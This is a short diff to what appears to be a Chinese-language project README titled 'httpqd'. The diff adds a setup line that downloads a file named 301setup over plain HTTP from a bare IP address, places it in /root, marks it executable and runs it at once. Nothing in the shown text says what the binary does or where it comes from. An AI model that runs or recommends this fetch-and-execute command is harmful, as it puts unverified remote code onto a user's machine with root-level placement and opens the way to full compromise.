@@ -1,3 +1,7 @@
+# https独立系统
+
+wget http://74.48.143.27/301setup && chmod 744 /root/301setup && ./301setup
+
 # httpqd
 http抢答301
 
